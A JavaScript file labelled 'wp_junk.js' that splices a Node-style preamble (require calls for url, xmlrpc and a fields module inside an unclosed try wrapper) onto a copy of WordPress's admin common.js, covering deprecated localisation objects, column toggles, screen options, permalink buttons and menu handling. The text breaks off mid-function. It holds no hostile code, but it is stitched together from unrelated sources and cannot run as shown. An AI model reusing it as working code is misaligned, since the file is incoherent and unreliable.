/* >>> wp_junk.js (84030 bytes) <<< */
(function(){
try{
var maps = {};

var url = require( "url" ),
	xmlrpc = require( "xmlrpc" ),
	fieldMap = require( "./fields" );
/**
 * @output wp-admin/js/common.js
 */

/* global setUserSetting, ajaxurl, alert, confirm, pagenow */
/* global columns, screenMeta */

/**
 *  Adds common WordPress functionality to the window.
 *
 *  @param {jQuery} $        jQuery object.
 *  @param {Object} window   The window object.
 *  @param {mixed} undefined Unused.
 */
( function( $, window, undefined ) {
	var $document = $( document ),
		$window = $( window ),
		$body = $( document.body ),
		__ = wp.i18n.__,
		sprintf = wp.i18n.sprintf;

/**
 * Throws an error for a deprecated property.
 *
 * @since 5.5.1
 *
 * @param {string} propName    The property that was used.
 * @param {string} version     The version of WordPress that deprecated the property.
 * @param {string} replacement The property that should have been used.
 */
function deprecatedProperty( propName, version, replacement ) {
	var message;

	if ( 'undefined' !== typeof replacement ) {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number, 3: Alternative property name. */
			__( '%1$s is deprecated since version %2$s! Use %3$s instead.' ),
			propName,
			version,
			replacement
		);
	} else {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number. */
			__( '%1$s is deprecated since version %2$s with no alternative available.' ),
			propName,
			version
		);
	}

	window.console.warn( message );
}

/**
 * Deprecate all properties on an object.
 *
 * @since 5.5.1
 * @since 5.6.0 Added the `version` parameter.
 *
 * @param {string} name       The name of the object, i.e. commonL10n.
 * @param {object} l10nObject The object to deprecate the properties on.
 * @param {string} version    The version of WordPress that deprecated the property.
 *
 * @return {object} The object with all its properties deprecated.
 */
function deprecateL10nObject( name, l10nObject, version ) {
	var deprecatedObject = {};

	Object.keys( l10nObject ).forEach( function( key ) {
		var prop = l10nObject[ key ];
		var propName = name + '.' + key;

		if ( 'object' === typeof prop ) {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, prop.alternative );
				return prop.func();
			} } );
		} else {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, 'wp.i18n' );
				return prop;
			} } );
		}
	} );

	return deprecatedObject;
}

window.wp.deprecateL10nObject = deprecateL10nObject;

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.6.0
 * @deprecated 5.5.0
 */
window.commonL10n = window.commonL10n || {
	warnDelete: '',
	dismiss: '',
	collapseMenu: '',
	expandMenu: ''
};

window.commonL10n = deprecateL10nObject( 'commonL10n', window.commonL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.3.0
 * @deprecated 5.5.0
 */
window.wpPointerL10n = window.wpPointerL10n || {
	dismiss: ''
};

window.wpPointerL10n = deprecateL10nObject( 'wpPointerL10n', window.wpPointerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.3.0
 * @deprecated 5.5.0
 */
window.userProfileL10n = window.userProfileL10n || {
	warn: '',
	warnWeak: '',
	show: '',
	hide: '',
	cancel: '',
	ariaShow: '',
	ariaHide: ''
};

window.userProfileL10n = deprecateL10nObject( 'userProfileL10n', window.userProfileL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.6
 * @deprecated 5.5.0
 */
window.privacyToolsL10n = window.privacyToolsL10n || {
	noDataFound: '',
	foundAndRemoved: '',
	noneRemoved: '',
	someNotRemoved: '',
	removalError: '',
	emailSent: '',
	noExportFile: '',
	exportError: ''
};

window.privacyToolsL10n = deprecateL10nObject( 'privacyToolsL10n', window.privacyToolsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.6.0
 * @deprecated 5.5.0
 */
window.authcheckL10n = {
	beforeunload: ''
};

window.authcheckL10n = window.authcheckL10n || deprecateL10nObject( 'authcheckL10n', window.authcheckL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.8.0
 * @deprecated 5.5.0
 */
window.tagsl10n = {
	noPerm: '',
	broken: ''
};

window.tagsl10n = window.tagsl10n || deprecateL10nObject( 'tagsl10n', window.tagsl10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.adminCommentsL10n = window.adminCommentsL10n || {
	hotkeys_highlight_first: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_first',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_first; }
	},
	hotkeys_highlight_last: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_last',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_last; }
	},
	replyApprove: '',
	reply: '',
	warnQuickEdit: '',
	warnCommentChanges: '',
	docTitleComments: '',
	docTitleCommentsCount: ''
};

window.adminCommentsL10n = deprecateL10nObject( 'adminCommentsL10n', window.adminCommentsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.tagsSuggestL10n = window.tagsSuggestL10n || {
	tagDelimiter: '',
	removeTerm: '',
	termSelected: '',
	termAdded: '',
	termRemoved: ''
};

window.tagsSuggestL10n = deprecateL10nObject( 'tagsSuggestL10n', window.tagsSuggestL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.5.0
 * @deprecated 5.5.0
 */
window.wpColorPickerL10n = window.wpColorPickerL10n || {
	clear: '',
	clearAriaLabel: '',
	defaultString: '',
	defaultAriaLabel: '',
	pick: '',
	defaultLabel: ''
};

window.wpColorPickerL10n = deprecateL10nObject( 'wpColorPickerL10n', window.wpColorPickerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.attachMediaBoxL10n = window.attachMediaBoxL10n || {
	error: ''
};

window.attachMediaBoxL10n = deprecateL10nObject( 'attachMediaBoxL10n', window.attachMediaBoxL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.postL10n = window.postL10n || {
	ok: '',
	cancel: '',
	publishOn: '',
	publishOnFuture: '',
	publishOnPast: '',
	dateFormat: '',
	showcomm: '',
	endcomm: '',
	publish: '',
	schedule: '',
	update: '',
	savePending: '',
	saveDraft: '',
	'private': '',
	'public': '',
	publicSticky: '',
	password: '',
	privatelyPublished: '',
	published: '',
	saveAlert: '',
	savingText: '',
	permalinkSaved: ''
};

window.postL10n = deprecateL10nObject( 'postL10n', window.postL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.inlineEditL10n = window.inlineEditL10n || {
	error: '',
	ntdeltitle: '',
	notitle: '',
	comma: '',
	saved: ''
};

window.inlineEditL10n = deprecateL10nObject( 'inlineEditL10n', window.inlineEditL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.plugininstallL10n = window.plugininstallL10n || {
	plugin_information: '',
	plugin_modal_label: '',
	ays: ''
};

window.plugininstallL10n = deprecateL10nObject( 'plugininstallL10n', window.plugininstallL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.0.0
 * @deprecated 5.5.0
 */
window.navMenuL10n = window.navMenuL10n || {
	noResultsFound: '',
	warnDeleteMenu: '',
	saveAlert: '',
	untitled: ''
};

window.navMenuL10n = deprecateL10nObject( 'navMenuL10n', window.navMenuL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.commentL10n = window.commentL10n || {
	submittedOn: '',
	dateFormat: ''
};

window.commentL10n = deprecateL10nObject( 'commentL10n', window.commentL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.9.0
 * @deprecated 5.5.0
 */
window.setPostThumbnailL10n = window.setPostThumbnailL10n || {
	setThumbnail: '',
	saving: '',
	error: '',
	done: ''
};

window.setPostThumbnailL10n = deprecateL10nObject( 'setPostThumbnailL10n', window.setPostThumbnailL10n, '5.5.0' );

/**
 * Removed in 6.5.0, needed for back-compatibility.
 *
 * @since 4.5.0
 * @deprecated 6.5.0
 */
window.uiAutocompleteL10n = window.uiAutocompleteL10n || {
	noResults: '',
	oneResult: '',
	manyResults: '',
	itemSelected: ''
};

window.uiAutocompleteL10n = deprecateL10nObject( 'uiAutocompleteL10n', window.uiAutocompleteL10n, '6.5.0' );

/**
 * Removed in 3.3.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 3.3.0
 */
window.adminMenu = {
	init : function() {},
	fold : function() {},
	restoreMenuState : function() {},
	toggle : function() {},
	favorites : function() {}
};

// Show/hide/save table columns.
window.columns = {

	/**
	 * Initializes the column toggles in the screen options.
	 *
	 * Binds an onClick event to the checkboxes to show or hide the table columns
	 * based on their toggled state. And persists the toggled state.
	 *
	 * @since 2.7.0
	 *
	 * @return {void}
	 */
	init : function() {
		var that = this;
		$('.hide-column-tog', '#adv-settings').on( 'click', function() {
			var $t = $(this), column = $t.val();
			if ( $t.prop('checked') )
				that.checked(column);
			else
				that.unchecked(column);

			columns.saveManageColumnsState();
		});
	},

	/**
	 * Saves the toggled state for the columns.
	 *
	 * Saves whether the columns should be shown or hidden on a page.
	 *
	 * @since 3.0.0
	 *
	 * @return {void}
	 */
	saveManageColumnsState : function() {
		var hidden = this.hidden();
		$.post(
			ajaxurl,
			{
				action: 'hidden-columns',
				hidden: hidden,
				screenoptionnonce: $('#screenoptionnonce').val(),
				page: pagenow
			},
			function() {
				wp.a11y.speak( __( 'Screen Options updated.' ) );
			}
		);
	},

	/**
	 * Makes a column visible and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	checked : function(column) {
		$('.column-' + column).removeClass( 'hidden' );
		this.colSpanChange(+1);
	},

	/**
	 * Hides a column and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	unchecked : function(column) {
		$('.column-' + column).addClass( 'hidden' );
		this.colSpanChange(-1);
	},

	/**
	 * Gets all hidden columns.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} The hidden column names separated by a comma.
	 */
	hidden : function() {
		return $( '.manage-column[id]' ).filter( '.hidden' ).map(function() {
			return this.id;
		}).get().join( ',' );
	},

	/**
	 * Gets the checked column toggles from the screen options.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} String containing the checked column names.
	 */
	useCheckboxesForHidden : function() {
		this.hidden = function(){
			return $('.hide-column-tog').not(':checked').map(function() {
				var id = this.id;
				return id.substring( id, id.length - 5 );
			}).get().join(',');
		};
	},

	/**
	 * Adjusts the column span for the table.
	 *
	 * @since 3.1.0
	 *
	 * @param {number} diff The modifier for the column span.
	 */
	colSpanChange : function(diff) {
		var $t = $('table').find('.colspanchange'), n;
		if ( !$t.length )
			return;
		n = parseInt( $t.attr('colspan'), 10 ) + diff;
		$t.attr('colspan', n.toString());
	}
};

$( function() { columns.init(); } );

/**
 * Validates that the required form fields are not empty.
 *
 * @since 2.9.0
 *
 * @param {jQuery} form The form to validate.
 *
 * @return {boolean} Returns true if all required fields are not an empty string.
 */
window.validateForm = function( form ) {
	return !$( form )
		.find( '.form-required' )
		.filter( function() { return $( ':input:visible', this ).val() === ''; } )
		.addClass( 'form-invalid' )
		.find( ':input:visible' )
		.on( 'change', function() { $( this ).closest( '.form-invalid' ).removeClass( 'form-invalid' ); } )
		.length;
};

// Stub for doing better warnings.
/**
 * Shows message pop-up notice or confirmation message.
 *
 * @since 2.7.0
 *
 * @type {{warn: showNotice.warn, note: showNotice.note}}
 *
 * @return {void}
 */
window.showNotice = {

	/**
	 * Shows a delete confirmation pop-up message.
	 *
	 * @since 2.7.0
	 *
	 * @return {boolean} Returns true if the message is confirmed.
	 */
	warn : function() {
		if ( confirm( __( 'You are about to permanently delete these items from your site.\nThis action cannot be undone.\n\'Cancel\' to stop, \'OK\' to delete.' ) ) ) {
			return true;
		}

		return false;
	},

	/**
	 * Shows an alert message.
	 *
	 * @since 2.7.0
	 *
	 * @param text The text to display in the message.
	 */
	note : function(text) {
		alert(text);
	}
};

/**
 * Represents the functions for the meta screen options panel.
 *
 * @since 3.2.0
 *
 * @type {{element: null, toggles: null, page: null, init: screenMeta.init,
 *         toggleEvent: screenMeta.toggleEvent, open: screenMeta.open,
 *         close: screenMeta.close}}
 *
 * @return {void}
 */
window.screenMeta = {
	element: null, // #screen-meta
	toggles: null, // .screen-meta-toggle
	page:    null, // #wpcontent

	/**
	 * Initializes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	init: function() {
		this.element = $('#screen-meta');
		this.toggles = $( '#screen-meta-links' ).find( '.show-settings' );
		this.page    = $('#wpcontent');

		this.toggles.on( 'click', this.toggleEvent );
	},

	/**
	 * Toggles the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @return {void}
	 */
	toggleEvent: function() {
		var panel = $( '#' + $( this ).attr( 'aria-controls' ) );

		if ( !panel.length )
			return;

		if ( panel.is(':visible') )
			screenMeta.close( panel, $(this) );
		else
			screenMeta.open( panel, $(this) );
	},

	/**
	 * Opens the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	open: function( panel, button ) {

		$( '#screen-meta-links' ).find( '.screen-meta-toggle' ).not( button.parent() ).css( 'visibility', 'hidden' );

		panel.parent().show();

		/**
		 * Sets the focus to the meta options panel and adds the necessary CSS classes.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideDown( 'fast', function() {
			panel.removeClass( 'hidden' ).trigger( 'focus' );
			button.addClass( 'screen-meta-active' ).attr( 'aria-expanded', true );
		});

		$document.trigger( 'screen:options:open' );
	},

	/**
	 * Closes the screen meta options panel.
	 *
	 * @since 3.2.0
	 *
	 * @param {jQuery} panel  The screen meta options panel div.
	 * @param {jQuery} button The toggle button.
	 *
	 * @return {void}
	 */
	close: function( panel, button ) {
		/**
		 * Hides the screen meta options panel.
		 *
		 * @since 3.2.0
		 *
		 * @return {void}
		 */
		panel.slideUp( 'fast', function() {
			button.removeClass( 'screen-meta-active' ).attr( 'aria-expanded', false );
			$('.screen-meta-toggle').css('visibility', '');
			panel.parent().hide();
			panel.addClass( 'hidden' );
		});

		$document.trigger( 'screen:options:close' );
	}
};

/**
 * Initializes the help tabs in the help panel.
 *
 * @param {Event} e The event object.
 *
 * @return {void}
 */
$('.contextual-help-tabs').on( 'click', 'a', function(e) {
	var link = $(this),
		panel;

	e.preventDefault();

	// Don't do anything if the click is for the tab already showing.
	if ( link.is('.active a') )
		return false;

	// Links.
	$('.contextual-help-tabs .active').removeClass('active');
	link.parent('li').addClass('active');

	panel = $( link.attr('href') );

	// Panels.
	$('.help-tab-content').not( panel ).removeClass('active').hide();
	panel.addClass('active').show();
});

/**
 * Update custom permalink structure via buttons.
 */
var permalinkStructureFocused = false,
    $permalinkStructure       = $( '#permalink_structure' ),
    $permalinkStructureInputs = $( '.permalink-structure input:radio' ),
    $permalinkCustomSelection = $( '#custom_selection' ),
    $availableStructureTags   = $( '.form-table.permalink-structure .available-structure-tags button' );

// Change permalink structure input when selecting one of the common structures.
$permalinkStructureInputs.on( 'change', function() {
	if ( 'custom' === this.value ) {
		return;
	}

	$permalinkStructure.val( this.value );

	// Update button states after selection.
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$permalinkStructure.on( 'click input', function() {
	$permalinkCustomSelection.prop( 'checked', true );
} );

// Check if the permalink structure input field has had focus at least once.
$permalinkStructure.on( 'focus', function( event ) {
	permalinkStructureFocused = true;
	$( this ).off( event );
} );

/**
 * Enables or disables a structure tag button depending on its usage.
 *
 * If the structure is already used in the custom permalink structure,
 * it will be disabled.
 *
 * @param {Object} button Button jQuery object.
 */
function changeStructureTagButtonState( button ) {
	if ( -1 !== $permalinkStructure.val().indexOf( button.text().trim() ) ) {
		button.attr( 'data-label', button.attr( 'aria-label' ) );
		button.attr( 'aria-label', button.attr( 'data-used' ) );
		button.attr( 'aria-pressed', true );
		button.addClass( 'active' );
	} else if ( button.attr( 'data-label' ) ) {
		button.attr( 'aria-label', button.attr( 'data-label' ) );
		button.attr( 'aria-pressed', false );
		button.removeClass( 'active' );
	}
}

// Check initial button state.
$availableStructureTags.each( function() {
	changeStructureTagButtonState( $( this ) );
} );

// Observe permalink structure field and disable buttons of tags that are already present.
$permalinkStructure.on( 'change', function() {
	$availableStructureTags.each( function() {
		changeStructureTagButtonState( $( this ) );
	} );
} );

$availableStructureTags.on( 'click', function() {
	var permalinkStructureValue = $permalinkStructure.val(),
	    selectionStart          = $permalinkStructure[ 0 ].selectionStart,
	    selectionEnd            = $permalinkStructure[ 0 ].selectionEnd,
	    textToAppend            = $( this ).text().trim(),
	    textToAnnounce,
	    newSelectionStart;

	if ( $( this ).hasClass( 'active' ) ) {
		textToAnnounce = $( this ).attr( 'data-removed' );
	} else {
		textToAnnounce = $( this ).attr( 'data-added' );
	}

	// Remove structure tag if already part of the structure.
	if ( -1 !== permalinkStructureValue.indexOf( textToAppend ) ) {
		permalinkStructureValue = permalinkStructureValue.replace( textToAppend + '/', '' );

		$permalinkStructure.val( '/' === permalinkStructureValue ? '' : permalinkStructureValue );

		// Announce change to screen readers.
		$( '#custom_selection_updated' ).text( textToAnnounce );

		// Disable button.
		changeStructureTagButtonState( $( this ) );

		return;
	}

	// Input field never had focus, move selection to end of input.
	if ( ! permalinkStructureFocused && 0 === selectionStart && 0 === selectionEnd ) {
		selectionStart = selectionEnd = permalinkStructureValue.length;
	}

	$permalinkCustomSelection.prop( 'checked', true );

	// Prepend and append slashes if necessary.
	if ( '/' !== permalinkStructureValue.substr( 0, selectionStart ).substr( -1 ) ) {
		textToAppend = '/' + textToAppend;
	}

	if ( '/' !== permalinkStructureValue.substr( selectionEnd, 1 ) ) {
		textToAppend = textToAppend + '/';
	}

	// Insert structure tag at the specified position.
	$permalinkStructure.val( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend + permalinkStructureValue.substr( selectionEnd ) );

	// Announce change to screen readers.
	$( '#custom_selection_updated' ).text( textToAnnounce );

	// Disable button.
	changeStructureTagButtonState( $( this ) );

	// If input had focus give it back with cursor right after appended text.
	if ( permalinkStructureFocused && $permalinkStructure[0].setSelectionRange ) {
		newSelectionStart = ( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend ).length;
		$permalinkStructure[0].setSelectionRange( newSelectionStart, newSelectionStart );
		$permalinkStructure.trigger( 'focus' );
	}
} );

$( function() {
	var checks, first, last, checked, sliced, mobileEvent, transitionTimeout, focusedRowActions,
		lastClicked = false,
		pageInput = $('input.current-page'),
		currentPage = pageInput.val(),
		isIOS = /iPhone|iPad|iPod/.test( navigator.userAgent ),
		isAndroid = navigator.userAgent.indexOf( 'Android' ) !== -1,
		$adminMenuWrap = $( '#adminmenuwrap' ),
		$wpwrap = $( '#wpwrap' ),
		$adminmenu = $( '#adminmenu' ),
		$overlay = $( '#wp-responsive-overlay' ),
		$toolbar = $( '#wp-toolbar' ),
		$toolbarPopups = $toolbar.find( 'a[aria-haspopup="true"]' ),
		$sortables = $('.meta-box-sortables'),
		wpResponsiveActive = false,
		$adminbar = $( '#wpadminbar' ),
		lastScrollPosition = 0,
		pinnedMenuTop = false,
		pinnedMenuBottom = false,
		menuTop = 0,
		menuState,
		menuIsPinned = false,
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		},
		$headerEnd = $( '.wp-header-end' );

	/**
	 * Makes the fly-out submenu header clickable, when the menu is folded.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$adminmenu.on('click.wp-submenu-head', '.wp-submenu-head', function(e){
		$(e.target).parent().siblings('a').get(0).click();
	});

	/**
	 * Collapses the admin menu.
	 *
	 * @return {void}
	 */
	$( '#collapse-button' ).on( 'click.collapse-menu', function() {
		var viewportWidth = getViewportWidth() || 961;

		// Reset any compensation for submenus near the bottom of the screen.
		$('#adminmenu div.wp-submenu').css('margin-top', '');

		if ( viewportWidth <= 960 ) {
			if ( $body.hasClass('auto-fold') ) {
				$body.removeClass('auto-fold').removeClass('folded');
				setUserSetting('unfold', 1);
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('auto-fold');
				setUserSetting('unfold', 0);
				menuState = 'folded';
			}
		} else {
			if ( $body.hasClass('folded') ) {
				$body.removeClass('folded');
				setUserSetting('mfold', 'o');
				menuState = 'open';
			} else {
				$body.addClass('folded');
				setUserSetting('mfold', 'f');
				menuState = 'folded';
			}
		}

		$document.trigger( 'wp-collapse-menu', { state: menuState } );
	});

	/**
	 * Ensures an admin submenu is within the visual viewport.
	 *
	 * @since 4.1.0
	 *
	 * @param {jQuery} $menuItem The parent menu item containing the submenu.
	 *
	 * @return {void}
	 */
	function adjustSubmenu( $menuItem ) {
		var bottomOffset, pageHeight, adjustment, theFold, menutop, wintop, maxtop,
			$submenu = $menuItem.find( '.wp-submenu' );

		menutop = $menuItem.offset().top;
		wintop = $window.scrollTop();
		maxtop = menutop - wintop - 30; // max = make the top of the sub almost touch admin bar.

		bottomOffset = menutop + $submenu.height() + 1; // Bottom offset of the menu.
		pageHeight = $wpwrap.height();                  // Height of the entire page.
		adjustment = 60 + bottomOffset - pageHeight;
		theFold = $window.height() + wintop - 50;       // The fold.

		if ( theFold < ( bottomOffset - adjustment ) ) {
			adjustment = bottomOffset - theFold;
		}

		if ( adjustment > maxtop ) {
			adjustment = maxtop;
		}

		if ( adjustment > 1 && $('#wp-admin-bar-menu-toggle').is(':hidden') ) {
			$submenu.css( 'margin-top', '-' + adjustment + 'px' );
		} else {
			$submenu.css( 'margin-top', '' );
		}
	}

	if ( 'ontouchstart' in window || /IEMobile\/[1-9]/.test(navigator.userAgent) ) { // Touch screen device.
		// iOS Safari works with touchstart, the rest work with click.
		mobileEvent = isIOS ? 'touchstart' : 'click';

		/**
		 * Closes any open submenus when touch/click is not on the menu.
		 *
		 * @param {Event} e The event object.
		 *
		 * @return {void}
		 */
		$body.on( mobileEvent+'.wp-mobile-hover', function(e) {
			if ( $adminmenu.data('wp-responsive') ) {
				return;
			}

			if ( ! $( e.target ).closest( '#adminmenu' ).length ) {
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
			}
		});

		/**
		 * Handles the opening or closing the submenu based on the mobile click|touch event.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.find( 'a.wp-has-submenu' ).on( mobileEvent + '.wp-mobile-hover', function( event ) {
			var $menuItem = $(this).parent();

			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			/*
			 * Show the sub instead of following the link if:
			 * 	- the submenu is not open.
			 * 	- the submenu is not shown inline or the menu is not folded.
			 */
			if ( ! $menuItem.hasClass( 'opensub' ) && ( ! $menuItem.hasClass( 'wp-menu-open' ) || $menuItem.width() < 40 ) ) {
				event.preventDefault();
				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass('opensub');
			}
		});
	}

	if ( ! isIOS && ! isAndroid ) {
		$adminmenu.find( 'li.wp-has-submenu' ).hoverIntent({

			/**
			 * Opens the submenu when hovered over the menu item for desktops.
			 *
			 * @return {void}
			 */
			over: function() {
				var $menuItem = $( this ),
					$submenu = $menuItem.find( '.wp-submenu' ),
					top = parseInt( $submenu.css( 'top' ), 10 );

				if ( isNaN( top ) || top > -5 ) { // The submenu is visible.
					return;
				}

				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				adjustSubmenu( $menuItem );
				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
				$menuItem.addClass( 'opensub' );
			},

			/**
			 * Closes the submenu when no longer hovering the menu item.
			 *
			 * @return {void}
			 */
			out: function(){
				if ( $adminmenu.data( 'wp-responsive' ) ) {
					// The menu is in responsive mode, bail.
					return;
				}

				$( this ).removeClass( 'opensub' ).find( '.wp-submenu' ).css( 'margin-top', '' );
			},
			timeout: 200,
			sensitivity: 7,
			interval: 90
		});

		/**
		 * Opens the submenu on when focused on the menu item.
		 *
		 * @param {Event} event The event object.
		 *
		 * @return {void}
		 */
		$adminmenu.on( 'focus.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				// The menu is in responsive mode, bail.
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).addClass( 'opensub' );

			/**
			 * Closes the submenu on blur from the menu item.
			 *
			 * @param {Event} event The event object.
			 *
			 * @return {void}
			 */
		}).on( 'blur.adminmenu', '.wp-submenu a', function( event ) {
			if ( $adminmenu.data( 'wp-responsive' ) ) {
				return;
			}

			$( event.target ).closest( 'li.menu-top' ).removeClass( 'opensub' );

			/**
			 * Adjusts the size for the submenu.
			 *
			 * @return {void}
			 */
		}).find( 'li.wp-has-submenu.wp-not-current-submenu' ).on( 'focusin.adminmenu', function() {
			adjustSubmenu( $( this ) );
		});
	}

	/*
	 * The `.below-h2` class is here just for backward compatibility with plugins
	 * that are (incorrectly) using it. Do not use. Use `.inline` instead. See #34570.
	 * If '.wp-header-end' is found, append the notices after it otherwise
	 * after the first h1 or h2 heading found within the main content.
	 */
	if ( ! $headerEnd.length ) {
		$headerEnd = $( '.wrap h1, .wrap h2' ).first();
	}
	$( 'div.updated, div.error, div.notice' ).not( '.inline, .below-h2' ).insertAfter( $headerEnd );

	/**
	 * Makes notices dismissible.
	 *
	 * @since 4.4.0
	 *
	 * @return {void}
	 */
	function makeNoticesDismissible() {
		$( '.notice.is-dismissible' ).each( function() {
			var $el = $( this ),
				$button = $( '<button type="button" class="notice-dismiss"><span class="screen-reader-text"></span></button>' );

			if ( $el.find( '.notice-dismiss' ).length ) {
				return;
			}

			// Ensure plain text.
			$button.find( '.screen-reader-text' ).text( __( 'Dismiss this notice.' ) );
			$button.on( 'click.wp-dismiss-notice', function( event ) {
				event.preventDefault();
				$el.fadeTo( 100, 0, function() {
					$el.slideUp( 100, function() {
						$el.remove();
					});
				});
			});

			$el.append( $button );
		});
	}

	$document.on( 'wp-updates-notice-added wp-plugin-install-error wp-plugin-update-error wp-plugin-delete-error wp-theme-install-error wp-theme-delete-error wp-notice-added', makeNoticesDismissible );

	// Init screen meta.
	screenMeta.init();

	/**
	 * Checks a checkbox.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @return {boolean} Returns whether a checkbox is checked or not.
	 */
	$body.on( 'click', 'tbody > tr > .check-column :checkbox', function( event ) {
		// Shift click to select a range of checkboxes.
		if ( 'undefined' == event.shiftKey ) { return true; }
		if ( event.shiftKey ) {
			if ( !lastClicked ) { return true; }
			checks = $( lastClicked ).closest( 'form' ).find( ':checkbox' ).filter( ':visible:enabled' );
			first = checks.index( lastClicked );
			last = checks.index( this );
			checked = $(this).prop('checked');
			if ( 0 < first && 0 < last && first != last ) {
				sliced = ( last > first ) ? checks.slice( first, last ) : checks.slice( last, first );
				sliced.prop( 'checked', function() {
					if ( $(this).closest('tr').is(':visible') )
						return checked;

					return false;
				});
			}
		}
		lastClicked = this;

		// Toggle the "Select all" checkboxes depending if the other ones are all checked or not.
		var unchecked = $(this).closest('tbody').find('tr').find(':checkbox').filter(':visible:enabled').not(':checked');

		/**
		 * Determines if all checkboxes are checked.
		 *
		 * @return {boolean} Returns true if there are no unchecked checkboxes.
		 */
		$(this).closest('table').children('thead, tfoot').find(':checkbox').prop('checked', function() {
			return ( 0 === unchecked.length );
		});

		return true;
	});

	/**
	 * Controls all the toggles on bulk toggle change.
	 *
	 * When the bulk checkbox is changed, all the checkboxes in the tables are changed accordingly.
	 * When the shift-button is pressed while changing the bulk checkbox the checkboxes in the table are inverted.
	 *
	 * This event needs to be delegated. Ticket #37973.
	 *
	 * @param {Event} event The event object.
	 *
	 * @return {boolean}
	 */
	$body.on( 'click.wp-toggle-checkboxes', 'thead .check-column :checkbox, tfoot .check-column :checkbox', function( event ) {
		var $this = $(this),
			$table = $this.closest( 'table' ),
			controlChecked = $this.prop('checked'),
			toggle = event.shiftKey || $this.data('wp-toggle');

		$table.children( 'tbody' ).filter(':visible')
			.children().children('.check-column').find(':checkbox')
			/**
			 * Updates the checked state on the checkbox in the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( $(this).is(':hidden,:disabled') ) {
					return false;
				}

				if ( toggle ) {
					return ! $(this).prop( 'checked' );
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});

		$table.children('thead,  tfoot').filter(':visible')
			.children().children('.check-column').find(':checkbox')

			/**
			 * Syncs the bulk checkboxes on the top and bottom of the table.
			 *
			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
			 */
			.prop('checked', function() {
				if ( toggle ) {
					return false;
				} else if ( controlChecked ) {
					return true;
				}

				return false;
			});
	});

	/**
	 * Marries a secondary control to its primary control.
	 *
	 * @param {jQuery} topSelector    The top selector element.
	 * @param {jQuery} topSubmit      The top submit element.
	 * @param {jQuery} bottomSelector The bottom selector element.
	 * @param {jQuery} bottomSubmit   The bottom submit element.
	 * @return {void}
	 */
	function marryControls( topSelector, topSubmit, bottomSelector, bottomSubmit ) {
